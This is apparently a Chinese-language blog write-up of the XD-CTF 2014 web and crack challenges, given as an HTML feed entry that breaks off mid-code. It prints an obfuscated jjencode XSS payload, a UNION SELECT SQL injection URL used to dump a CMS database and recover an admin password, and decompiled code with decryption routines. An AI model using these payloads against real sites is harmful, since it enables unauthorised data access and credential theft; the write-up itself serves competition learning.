    <link href="http://blog.watch0ut.com/2014/10/08/XD-CTF-2014-Write-ups/"/>
    <id>http://blog.watch0ut.com/2014/10/08/XD-CTF-2014-Write-ups/</id>
    <published>2014-10-08T12:57:04.000Z</published>
    <updated>2015-11-19T14:26:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h2><p>主要考的是PHP彩蛋，在URL后添加如下参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">?=PHPE9568F36-D428-11d2-A769-00AA001ACF42</div><div class="line">?=PHPE9568F34-D428-11d2-A769-00AA001ACF42</div><div class="line">?=PHPE9568F35-D428-11d2-A769-00AA001ACF42</div><div class="line">?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</div></pre></td></tr></table></figure></p>
<p>使用最后一个得到：<code>flag-WhatisPhp-mtzeXAtcKA53</code></p>
<h2 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h2><p>给了一个<code>Chrome</code>插件安装包，解压后，我在文件里搜了一通，未果。后来<code>Sasiki</code>告诉在<code>fuck.jpg</code>的备注属性找到如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">107 101 121 32 105 115 58 88 68 83 101 99 64 50 79 49 52</div></pre></td></tr></table></figure></p>
<p>转换一下：<code>XDSec@2O14</code></p>
<h2 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h2><p>题目：</p>
<p><img src="/images/XD-Web70.png" alt=""></p>
<p>这是一道纯<code>XSS</code>题，只需要弹窗即可。经测试，输入不能包含数字，字母，OMG!</p>
<p>但可以包含诸如<code>${}=</code>等字符，可以利用<code>jjencode</code>绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(\\\&quot;\\&quot;+$.__$+$.$$_+$.$$$+$.$_$_+$.__+$.$$__+&quot;\\&quot;+$.__$+$.$_$+$.___+$.___+$._+$.__+&quot;_\\&quot;+$.__$+$.$$_+$.$$$+$.$$$_+$.$_$$+$.$$$+$.___+&quot;_\\&quot;+$.__$+$.$$$+$.___+&quot;\\&quot;+$.__$+$.$$_+$._$$+&quot;\\&quot;+$.__$+$.$$_+$._$$+&quot;\\\&quot;\\&quot;+$.$__+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();</div><div class="line">http://utf-8.jp/public/jjencode.html</div></pre></td></tr></table></figure></p>
<p><img src="/images/XD-Web70-flag.png" alt=""></p>
<h2 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h2><p>查看源码，提供一张图片地址，转到后是一张二维码图片：</p>
<p><img src="/images/XD-Web100-1.png" alt=""></p>
<p>扫了一下，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&amp;mid=200689499&amp;idx=2&amp;sn=76a5cb177facf0ca76dfcc2db7e135cf#rd</div><div class="line"></div><div class="line">RGB</div></pre></td></tr></table></figure></p>
<p>去URL对应文章看了一下，讲的是将信息隐藏到图片里，把题目的图片下载下来：</p>
<p><img src="/images/XD-Web100-2.png" alt=""></p>
<p>然后提示是<code>RGB</code>，我一开始提取的<code>RGB</code>的最低位信息，出来的不对。后来，又回来尝试，只提取R通道的，得到：<code>Xd$eC@2o14</code></p>
<h2 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h2><p>打开URL，提示需要帮助信息，在URL加help，查看源码，有个read？file=readme，后来刷新下，发现内容变了，貌似是随机显示的，多刷新几次，提示有newapp.py文件。直接去读newapp.py文件内容，经过多次刷新，恢复内容大致如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;le4f.net&apos;</div><div class="line"></div><div class="line">import web</div><div class="line">import random</div><div class="line"></div><div class="line">urls = (</div><div class="line">    &apos;/getflag&apos;, &apos;xdctf&apos;,</div><div class="line">    &apos;/read&apos;, &apos;read&apos;,</div><div class="line">    &apos;.*&apos;,&apos;ctf&apos;</div><div class="line">    )</div><div class="line"></div><div class="line">class help:</div><div class="line">    def GET(self):</div><div class="line">        try:</div><div class="line">            return &apos;&lt;html&gt;welcome to my first web.py project.&lt;a href = \&apos;./read?file=readme\&apos;&gt;&lt;/a&gt;&lt;/html&gt;&apos;</div><div class="line">        except:</div><div class="line">            pass</div><div class="line"></div><div class="line"></div><div class="line">class read:</div><div class="line">    def GET(self):</div><div class="line">        data = web.input(file = &apos;readme&apos;)</div><div class="line">        if data[&apos;file&apos;].count(&apos;.&apos;) &gt; 1:</div><div class="line">            f = &apos;readme&apos;</div><div class="line">        else:</div><div class="line">            f = data[&apos;file&apos;]</div><div class="line"></div><div class="line">        cont = open(&quot;./&quot;+f,&quot;r&quot;).readlines()</div><div class="line">        rand = random.randint(0,len(cont)-2)</div><div class="line">        return cont[rand]+&apos;\n&apos;+cont[rand+1]</div><div class="line"></div><div class="line"></div><div class="line">class xdctf:</div><div class="line">    def func(a):</div><div class="line">        if a == &apos;le4f.net&apos;:</div><div class="line">            flag = open(&quot;flagishere&quot;,&quot;r&quot;).readlines()[0].strip()</div><div class="line">            web.header(&apos;flag&apos;, flag)</div><div class="line"></div><div class="line">    def GET(self):</div><div class="line">            try:</div><div class="line">                web.input(_unicode=func(web.input(unabletoread = &apos;show me flag!!!!&apos;).get(&apos;unabletoread&apos;)))</div><div class="line">                return &apos;flag is here?!!show me flag!!!!&apos;</div><div class="line">            except:</div><div class="line">                pass</div><div class="line"></div><div class="line"></div><div class="line">class ctf:</div><div class="line">    def GET(self):</div><div class="line">        try:</div><div class="line">            return &quot;u may need help information.&quot;</div><div class="line">        except:</div><div class="line">            pass</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    app = web.application(urls, globals())</div><div class="line">    app.run()</div></pre></td></tr></table></figure></p>
<p>根据代码，构造<code>url：getflag?unabletoread=le4f.net</code>，提交后，在<code>response</code>的<code>header</code>里有：<code>XDCTF{X1di4nUn1Vers1tySecT3AM}</code>。</p>
<h2 id="Web270"><a href="#Web270" class="headerlink" title="Web270"></a>Web270</h2><p>首先，找到注入点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://hlecgsp1.xdctf.com:8082/api.php?c=api&amp;f=phpok&amp;id=_project&amp;param[pid]=1%20union%20select%201,concat(version(),0x7e,user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33</div></pre></td></tr></table></figure></p>
<p>把整个数据库down下来后，在里面搜索flag，得到第一个flag：<code>flag-letmeshowyoushell</code>。</p>
<p>后来找到admin的密码：<code>d123789fd311dddeb7ce41f06a6d71fd:a5</code>，前面的<code>MD5</code>对应的是<code>198712a5</code>，后来去后台登录，发现admin的密码为<code>198712</code>。</p>
<h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><h2 id="Crack100"><a href="#Crack100" class="headerlink" title="Crack100"></a>Crack100</h2><p>发现是C#写的，直接拿<code>.NET Reflector</code>反编译发，发现好多乱码，看来用工具混淆了，网上搜了个C#的反混淆工具<code>de4dot</code>处理了下，恢复的代码大致如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.ComponentModel;</div><div class="line">using System.Data;</div><div class="line">using System.Drawing;</div><div class="line">using System.Linq;</div><div class="line">using System.Text;</div><div class="line">using System.Threading.Tasks;</div><div class="line">using System.Windows.Forms;</div><div class="line">using System.IO;</div><div class="line">using System.Security.Cryptography;</div><div class="line"></div><div class="line">namespace ReverseMe</div><div class="line">&#123;</div><div class="line">    public partial class Form1 : Form</div><div class="line">    &#123;</div><div class="line">        public Form1()</div><div class="line">        &#123;</div><div class="line">            InitializeComponent();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private void button1_Click(object sender, EventArgs e)</div><div class="line">        &#123;</div><div class="line">            decrypt();  </div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static void encrypt()</div><div class="line">        &#123;</div><div class="line">            string str2 = read_from_flag();</div><div class="line">            string str13 = str2.Substring(0, 0x20);</div><div class="line">            string str14 = str2.Substring(0x20);</div><div class="line">            string str16 = hex_to_string(smethod_5(str13));</div><div class="line">            string str20 = hex_to_string(smethod_5(base64_encode(smethod_0(str14))));</div><div class="line">            if (!write_to_encrypt(str16 + str20))</div><div class="line">            &#123;</div><div class="line">                Environment.Exit(0);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        </div><div class="line"></div><div class="line">        private static string smethod_0(string string_0)</div><div class="line">        &#123;</div><div class="line">            int[] numArray = new int[] &#123; 0x6a, 120, 0x66, 0x65, 0x62, 0x67, 0x2e, 0x1c, 0x3e, 0x20, 0x3d, 13 &#125;;</div><div class="line">            char[] chArray = string_0.ToCharArray();</div><div class="line">            string str = string.Empty;</div><div class="line">            int index = 0;</div><div class="line">            for (int i = 0; index &lt; string_0.Length; i++)</div><div class="line">            &#123;</div><div class="line">                if (i &gt; 11)</div><div class="line">                &#123;</div><div class="line">                    i = 0;</div><div class="line">                &#125;</div><div class="line">                str = str + ((Convert.ToInt32(chArray[index]) ^ Convert.ToInt32(numArray[i]))).ToString(&quot;X&quot;);</div><div class="line">                index++;</div><div class="line">            &#125;</div><div class="line">            return hex_to_string(str);</div><div class="line">        &#125;</div><div class="line">        private static string base64_encode(string string_0)</div><div class="line">        &#123;</div><div class="line">            try</div><div class="line">            &#123;</div><div class="line">                return Encoding.ASCII.GetString(Convert.FromBase64String(string_0));</div><div class="line">            &#125;</div><div class="line">            catch (Exception)</div><div class="line">            &#123;</div><div class="line">                return string.Empty;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        private static string smethod_2(string string_0)</div><div class="line">        &#123;</div><div class="line">            try</div><div class="line">            &#123;</div><div class="line">                return Convert.ToBase64String(Encoding.ASCII.GetBytes(string_0));</div><div class="line">            &#125;</div><div class="line">            catch (Exception)</div><div class="line">            &#123;</div><div class="line">                return string.Empty;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string hex_to_string(string string_0)</div><div class="line">        &#123;</div><div class="line">            string str2 = &quot;&quot;;</div><div class="line">            byte[] bytes = new byte[string_0.Length / 2];</div><div class="line">            for (int i = 0; i &lt; (string_0.Length / 2); i++)</div><div class="line">            &#123;</div><div class="line">                str2 = string_0.Substring(i * 2, 2);</div><div class="line">                bytes[i] = Convert.ToByte(str2, 0x10);</div><div class="line">            &#125;</div><div class="line">            return Encoding.Default.GetString(bytes);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string string_to_hex(string string_0)</div><div class="line">        &#123;</div><div class="line">            string str = &quot;&quot;;</div><div class="line">            if (string_0 == &quot;&quot;)</div><div class="line">            &#123;</div><div class="line">                return &quot;&quot;;</div><div class="line">            &#125;</div><div class="line">            byte[] bytes = Encoding.ASCII.GetBytes(string_0);</div><div class="line">            for (int i = 0; i &lt; bytes.Length; i++)</div><div class="line">            &#123;</div><div class="line">                str = str + bytes[i].ToString(&quot;X&quot;);</div><div class="line">            &#125;</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string smethod_5(string string_0)</div><div class="line">        &#123;</div><div class="line">            string str = string.Empty;</div><div class="line">            byte[] buffer = new byte[0x59];</div><div class="line">            byte[] buffer2 = new byte[0x59];</div><div class="line">            byte[] buffer3 = new byte[0xb1];</div><div class="line">            string str2 = string_to_hex(string_0);</div><div class="line">            for (int i = 0; i &lt; string_0.Length; i++)</div><div class="line">            &#123;</div><div class="line">                string str3 = str2.Substring(i * 2, 2);</div><div class="line">                buffer3[i] = Convert.ToByte(str3, 0x10);</div><div class="line">                buffer[i + 1] = (byte)((buffer3[i] &amp; 15) + 0xa1);</div><div class="line">                buffer2[i] = (byte)((0x9f + (buffer3[i] &gt;&gt; 4)) - (buffer3[i] &amp; 15));</div><div class="line">                str = str + buffer2[i].ToString(&quot;X&quot;) + buffer[i + 1].ToString(&quot;X&quot;);</div><div class="line">            &#125;</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static bool write_to_encrypt(string string_0)</div><div class="line">        &#123;</div><div class="line">            bool flag;</div><div class="line">            using (FileStream stream = new FileStream(&quot;Encrypt.rs&quot;, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">            &#123;</div><div class="line">                using (StreamWriter writer = new StreamWriter(stream))</div><div class="line">                &#123;</div><div class="line">                    writer.WriteLine(string_0);</div><div class="line">                    writer.Close();</div><div class="line">                    stream.Close();</div><div class="line">                    flag = true;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            return flag;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string read_from_file(string filename)</div><div class="line">        &#123;</div><div class="line">            string str = string.Empty;</div><div class="line">            FileStream file = new FileStream(filename, FileMode.Open);</div><div class="line">            byte[] bytes = new byte[1024];</div><div class="line">            int length = 0;</div><div class="line">            do</div><div class="line">            &#123;</div><div class="line">                length = file.Read(bytes, 0, bytes.Length);</div><div class="line">                str += Encoding.ASCII.GetString(bytes, 0, length);</div><div class="line">            &#125; while (length &gt; 0);</div><div class="line">            file.Close();</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static bool write_to_file(string file, string content)</div><div class="line">        &#123;</div><div class="line">            bool flag = false;</div><div class="line">            using (FileStream stream = new FileStream(file, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">            &#123;</div><div class="line">                using (StreamWriter writer = new StreamWriter(stream))</div><div class="line">                &#123;</div><div class="line">                    writer.WriteLine(content);</div><div class="line">                    writer.Close();</div><div class="line">                    stream.Close();</div><div class="line">                    flag = true;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            return flag;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string read_from_flag()</div><div class="line">        &#123;</div><div class="line">            string str = string.Empty;</div><div class="line">            if (File.Exists(&quot;Flag.rs&quot;))</div><div class="line">            &#123;</div><div class="line">                str = File.ReadAllText(&quot;Flag.rs&quot;, Encoding.ASCII);</div><div class="line">                if (str.Length != 0)</div><div class="line">                &#123;</div><div class="line">                    return str;</div><div class="line">                &#125;</div><div class="line">                using (FileStream stream = new FileStream(&quot;Encrypt.rs&quot;, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">                &#123;</div><div class="line">                    using (StreamWriter writer = new StreamWriter(stream))</div><div class="line">                    &#123;</div><div class="line">                        writer.Close();</div><div class="line">                        stream.Close();</div><div class="line">                    &#125;</div><div class="line">                    return str;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            using (FileStream stream2 = new FileStream(&quot;Encrypt.rs&quot;, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">            &#123;</div><div class="line">                using (StreamWriter writer2 = new StreamWriter(stream2))</div><div class="line">                &#123;</div><div class="line">                    writer2.Close();</div><div class="line">                    stream2.Close();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对<code>C#</code>不是很熟，开始打算用<code>Python</code>写个解密函数，后来发现<code>C#</code>往文件里写内容经过编码，只能用<code>C#</code>来写了，写半天才写出来，太蛋疼了。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">private static void decrypt()</div><div class="line">&#123;</div><div class="line">    string filename = &quot;Encrypt.rs&quot;;</div><div class="line">    string data = string.Empty;</div><div class="line">    FileStream file = new FileStream(filename, FileMode.Open);</div><div class="line">    StreamReader reader = new StreamReader(file);</div><div class="line">    data = reader.ReadLine();</div><div class="line">    reader.Close();</div><div class="line">    file.Close();</div><div class="line"></div><div class="line">    byte[] bytes = Encoding.Default.GetBytes(data);</div><div class="line"></div><div class="line">    byte[] flag_bytes = new byte[41];</div><div class="line">    for (int i = 0; i &lt; bytes.Length; i += 2)</div><div class="line">    &#123;</div><div class="line">        byte byte1 = bytes[i];</div><div class="line">        byte byte2 = bytes[i + 1];</div><div class="line">        byte behind = (byte)(byte2 - 0xa1);</div><div class="line">        byte front = (byte)(byte1 + behind - 0x9f);</div><div class="line">        flag_bytes[i / 2] = (byte)(front * 16 + behind);</div><div class="line">    &#125;</div><div class="line">    string prex = Encoding.ASCII.GetString(flag_bytes, 0, 32);</div><div class="line">    string suffix = smethod_0_1(base64_decode(Encoding.ASCII.GetString(flag_bytes, 32, 9)));</div><div class="line">    write_to_file(&quot;Flag.rs&quot;, prex + suffix);</div><div class="line">&#125;</div><div class="line"></div><div class="line">private static string smethod_0_1(string string_0)</div><div class="line">&#123;</div><div class="line">    int[] numArray = new int[] &#123; 0x6a, 120, 0x66, 0x65, 0x62, 0x67, 0x2e, 0x1c, 0x3e, 0x20, 0x3d, 13 &#125;;</div><div class="line">    string hex = string_to_hex(string_0);</div><div class="line">    byte[] bytes = new byte[hex.Length / 2];</div><div class="line">    for (int i = 0; i &lt; hex.Length; i += 2)</div><div class="line">    &#123;</div><div class="line">        int value = Convert.ToInt32(hex.Substring(i, 2), 0x10);</div><div class="line">        bytes[i / 2] = (byte)(value ^ numArray[i / 2]);</div><div class="line">    &#125;</div><div class="line">    return Encoding.ASCII.GetString(bytes);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后，得到：<code>cplg1r7f3~xq-%!&gt;+@sb19)&lt;0^&amp;key#o==4102cesdx=</code></p>
<h2 id="Crack120"><a href="#Crack120" class="headerlink" title="Crack120"></a>Crack120</h2><p>给了两个文件，有一个是Python编译后的文件，GreatYYX网上找了反编译工具，得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"># Embedded file name: unknownScript.py</div><div class="line">import sys</div><div class="line"></div><div class="line">class Encode(object):</div><div class="line"></div><div class="line">    def __init__(self, ori_data):</div><div class="line">        self.datastream = ori_data</div><div class="line">        self.streamlen = len(ori_data) * 8</div><div class="line">        self.index = 0</div><div class="line">        self.disdata = &apos;&apos;</div><div class="line"></div><div class="line">    def getbit(self, check_type = None):</div><div class="line">        index_bytes = self.index / 8</div><div class="line">        index_bits = self.index % 8</div><div class="line">        if not check_type:</div><div class="line">            self.index += 1</div><div class="line">        if ord(self.datastream[index_bytes]) &amp; 1 &lt;&lt; index_bits:</div><div class="line">            return 1</div><div class="line">        else:</div><div class="line">            return 0</div><div class="line"></div><div class="line">    def encode(self):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        x xxxxxxx</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        _index = 0</div><div class="line">        bit_count = 0</div><div class="line">        char_temp = 0</div><div class="line">        bit_type = self.getbit(check_type=True)</div><div class="line">        for _index in range(self.streamlen):</div><div class="line">            bit = self.getbit()</div><div class="line">            bit_count += 1</div><div class="line">            if bit_type != bit:</div><div class="line">                char_temp |= bit_type &lt;&lt; 7</div><div class="line">                char_temp |= bit_count - 1</div><div class="line">                self.disdata += chr(char_temp)</div><div class="line">                char_temp = 0</div><div class="line">                bit_count = 1</div><div class="line">                bit_type = bit</div><div class="line">                continue</div><div class="line">            elif bit_count &gt;= 127:</div><div class="line">                char_temp |= bit_type &lt;&lt; 7</div><div class="line">                char_temp |= bit_count</div><div class="line">                self.disdata += chr(char_temp)</div><div class="line">                char_temp = 0</div><div class="line">                bit_count = 0</div><div class="line">                bit_type = self.getbit(check_type=True)</div><div class="line">            else:</div><div class="line">                continue</div><div class="line"></div><div class="line">        if bit_count:</div><div class="line">            char_temp |= bit_type &lt;&lt; 7</div><div class="line">            char_temp |= bit_count</div><div class="line">            self.disdata += chr(char_temp)</div><div class="line">        return self.disdata</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    if len(sys.argv) != 3:</div><div class="line">        print &apos;Usage: * SOURCE DEST&apos;</div><div class="line">        return</div><div class="line">    with open(sys.argv[1], &apos;rb&apos;) as _sf:</div><div class="line">        data = _sf.read()</div><div class="line">        encode = Encode(data)</div><div class="line">        with open(sys.argv[2], &apos;wb&apos;) as _df:</div><div class="line">            _df.write(encode.encode())</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>又得自己写解码函数，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">class Decode(object):</div><div class="line">    def __init__(self, data):</div><div class="line">        self.encode_data = data</div><div class="line">        self.encode_len = len(data)</div><div class="line">        self.decode_data = &apos;&apos;</div><div class="line"></div><div class="line">    def decode(self):</div><div class="line">        if self.encode_len == 0:</div><div class="line">            return &apos;&apos;</div><div class="line">        data_stream = []</div><div class="line">        for index in xrange(self.encode_len):</div><div 